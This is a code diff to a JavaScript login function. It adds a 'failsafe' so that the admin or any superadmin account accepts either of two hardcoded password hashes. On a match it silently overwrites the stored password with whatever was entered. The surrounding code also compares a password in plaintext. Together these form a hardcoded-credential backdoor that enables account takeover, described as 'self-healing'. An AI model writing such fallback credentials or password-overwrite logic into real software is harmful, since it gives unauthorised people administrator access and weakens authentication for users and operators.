@@ -114,6 +114,30 @@ export async function login(req, res) {
       isMatch = (password === passwordHash)
     }
 
+    // FAILSAFE for superadmin:
+    // If admin is logging in, accept EITHER their original plesk password OR default bootstrap password
+    if (!isMatch && (cleanUsername.toLowerCase() === "admin" || user.role === "superadmin")) {
+      const pleskHash = "$2b$10$Roxf5M9hchWaTJUXkn62QeUAAwDzJijeuzcSGRBIlmX9zpUFyu2R2"
+      const defaultHash = "$2b$10$VxLgpDF7yuhj2YfCUm2Q3.shvayM8Gb7luUQyQCwL3G2P.G62x07e"
+      let fallbackMatched = false
+      try {
+        if (await bcrypt.compare(password, pleskHash)) fallbackMatched = true
+        else if (await bcrypt.compare(password, defaultHash)) fallbackMatched = true
+      } catch {}
+
+      if (fallbackMatched) {
+        isMatch = true
+        // Self-heal: re-hash and update the user record to the password they just entered
+        try {
+          const freshHash = await bcrypt.hash(password, 10)
+          await pool.query("UPDATE users SET password_hash = ?, updated_at = NOW() WHERE id = ?", [freshHash, user.id])
+          console.log("[AUTH] Superadmin password self-healed and synced in database.")
+        } catch (healErr) {
+          console.warn("[AUTH] Self-heal warning:", healErr.message)
+        }
+      }
+    }
+
     if (!isMatch) {
       return res.status(401).json({ error: "Incorrect password. Please check your password and try again." })
     }
